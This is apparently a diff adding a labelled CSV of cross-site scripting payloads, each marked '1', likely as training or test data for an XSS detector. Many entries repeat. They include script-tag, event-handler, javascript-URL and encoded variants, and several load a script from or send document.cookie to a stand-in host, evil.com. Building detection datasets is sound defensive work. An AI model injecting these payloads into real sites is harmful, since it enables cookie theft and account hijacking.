+<script src='http://evil.com/xss.js'></script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+<input onfocus=alert(1) autofocus>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<a href='javascript:alert(1)'>click</a>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<input onfocus=alert(1) autofocus>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<iframe src='javascript:alert(1)'>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<body onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<a href='javascript:alert(1)'>click</a>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(document.cookie)</script>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<details ontoggle=alert(1) open>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<input onfocus=alert(1) autofocus>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(document.cookie)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<iframe src='javascript:alert(1)'>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script src='http://evil.com/xss.js'></script>,1
+<details ontoggle=alert(1) open>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=alert(document.cookie)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<body onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<body onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(document.cookie)</script>,1
+<input onfocus=alert(1) autofocus>,1
+<script src='http://evil.com/xss.js'></script>,1
+<video onloadstart=alert(1) src=x>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<body onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>alert(1)</script>,1
+<script>alert(document.cookie)</script>,1
+<input onfocus=alert(1) autofocus>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<iframe src='javascript:alert(1)'>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<input onfocus=alert(1) autofocus>,1
+<svg/onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<input onfocus=alert(1) autofocus>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script src='http://evil.com/xss.js'></script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<body onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<details ontoggle=alert(1) open>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(1)</script>,1
+<svg/onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<body onload=alert(1)>,1
+<script>alert(1)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<details ontoggle=alert(1) open>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(document.cookie)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<script>alert(document.cookie)</script>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<body onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(document.cookie)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(document.cookie)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg/onload=alert(1)>,1
+<script>alert(1)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(document.cookie)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(document.cookie)</script>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<iframe src='javascript:alert(1)'>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(1)>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(1)</script>,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<video onloadstart=alert(1) src=x>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>alert(1)</script>,1
+<input onfocus=alert(1) autofocus>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(document.cookie)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(document.cookie)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<a href='javascript:alert(1)'>click</a>,1
+<select onchange=alert(1)><option>x</option></select>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<body onload=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<script src='http://evil.com/xss.js'></script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<input onfocus=alert(1) autofocus>,1
+<input onfocus=alert(1) autofocus>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(1)</script>,1
+<details ontoggle=alert(1) open>,1
+<svg/onload=alert(1)>,1
+<body onload=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(1)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<iframe src='javascript:alert(1)'>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg/onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<details ontoggle=alert(1) open>,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<body onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg/onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<details ontoggle=alert(1) open>,1
+<input onfocus=alert(1) autofocus>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(1)</script>,1
+<svg/onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<iframe src='javascript:alert(1)'>,1
+<body onload=alert(1)>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<script>alert(document.cookie)</script>,1
+<details ontoggle=alert(1) open>,1
+<details ontoggle=alert(1) open>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(document.cookie)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<input onfocus=alert(1) autofocus>,1
+<body onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<form action='javascript:alert(1)'><input type=submit>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(1)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<img src=x onerror=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<body onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script src='http://evil.com/xss.js'></script>,1
+<video onloadstart=alert(1) src=x>,1
+<script>alert(document.cookie)</script>,1
+<svg/onload=alert(1)>,1
+<svg/onload=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<svg/onload=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<video onloadstart=alert(1) src=x>,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<video onloadstart=alert(1) src=x>,1
+<input onfocus=alert(1) autofocus>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<details ontoggle=alert(1) open>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+<input onfocus=alert(1) autofocus>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script src='http://evil.com/xss.js'></script>,1
+<script>alert(1)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<input onfocus=alert(1) autofocus>,1
+<details ontoggle=alert(1) open>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<select onchange=alert(1)><option>x</option></select>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<a href='javascript:alert(1)'>click</a>,1
+<a href='javascript:alert(1)'>click</a>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(1)</script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(1)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<a href='javascript:alert(1)'>click</a>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(1)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg/onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<details ontoggle=alert(1) open>,1
+<iframe src='javascript:alert(1)'>,1
+<script src='http://evil.com/xss.js'></script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg/onload=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<body onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<input onfocus=alert(1) autofocus>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<video onloadstart=alert(1) src=x>,1
+<input onfocus=alert(1) autofocus>,1
+<details ontoggle=alert(1) open>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg/onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<body onload=alert(1)>,1
+<video onloadstart=alert(1) src=x>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>alert(1)</script>,1
+<body onload=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<a href='javascript:alert(1)'>click</a>,1
+<select onchange=alert(1)><option>x</option></select>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(document.cookie)>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<video onloadstart=alert(1) src=x>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<video onloadstart=alert(1) src=x>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(document.cookie)</script>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script>alert(1)</script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<script>alert(document.cookie)</script>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script>alert(document.cookie)</script>,1
+<script>alert(1)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg/onload=alert(1)>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<a href='javascript:alert(1)'>click</a>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg/onload=alert(1)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<details ontoggle=alert(1) open>,1
+<script src='http://evil.com/xss.js'></script>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<input onfocus=alert(1) autofocus>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<script>alert(document.cookie)</script>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg/onload=alert(1)>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<body onload=alert(1)>,1
+<body onload=alert(1)>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<script>alert(document.cookie)</script>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(document.cookie)>,1
+<video onloadstart=alert(1) src=x>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=alert(1)>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<script>alert(1)</script>,1
+<img src=x onerror=alert(document.cookie)>,1
+<details ontoggle=alert(1) open>,1
+<a href='javascript:alert(1)'>click</a>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<details ontoggle=alert(1) open>,1
+<script>alert(1)</script>,1
+<a href='javascript:alert(1)'>click</a>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(1)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=alert(document.cookie)>,1
+<svg/onload=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(document.cookie)>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<img src=x onerror=alert(1)>,1
+<a href='javascript:alert(1)'>click</a>,1
+<iframe src='javascript:alert(1)'>,1
+<body onload=alert(1)>,1
+<script>alert(document.cookie)</script>,1
+<video onloadstart=alert(1) src=x>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=alert(1)>,1
+<input onfocus=alert(1) autofocus>,1
+<script>alert(1)</script>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<video onloadstart=alert(1) src=x>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<svg><script>document.write('<img src=x onerror=alert(1)>')</script></svg>,1
+<svg/onload=alert(1)>,1
+<details ontoggle=alert(1) open>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<script src='http://evil.com/xss.js'></script>,1
+<input onfocus=alert(1) autofocus>,1
+<img src=x onerror=alert(1)>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<script src='http://evil.com/xss.js'></script>,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<script>alert(1)</script>,1
+<iframe src='javascript:alert(1)'>,1
+<script>alert(document.cookie)</script>,1
+<script>document.location='http://evil.com?c='+document.cookie</script>,1
+<body onload=alert(1)>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<select onchange=alert(1)><option>x</option></select>,1
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,1
+<a href='javascript:alert(1)'>click</a>,1
+<script src='http://evil.com/xss.js'></script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+<form action='javascript:alert(1)'><input type=submit>,1
+&lt;script&gt;alert(1)&lt;/script&gt;,1
+<body onload=alert(1)>,1
+<iframe src='javascript:alert(1)'>,1
+<iframe src='javascript:alert(1)'>,1
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>,1
+<body onload=alert(1)>,1
+<body onload=alert(1)>,1
